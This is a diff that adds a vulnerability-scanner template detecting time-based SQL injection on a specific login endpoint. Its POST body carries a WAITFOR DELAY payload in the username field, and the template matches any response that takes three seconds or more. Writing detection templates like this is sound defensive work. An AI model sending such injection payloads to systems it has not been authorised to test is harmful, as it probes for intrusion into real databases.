@@ -1,0 +1,26 @@
+id: sql-injection-delay
+info:
+  name: SQL Injection with Delay
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects SQL Injection vulnerability with a delay of 3 seconds using the WAITFOR DELAY payload.
+  tags: sqli,delay
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=1'WAITFOR+DELAY'0%3a0%3a3'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration >= 3"
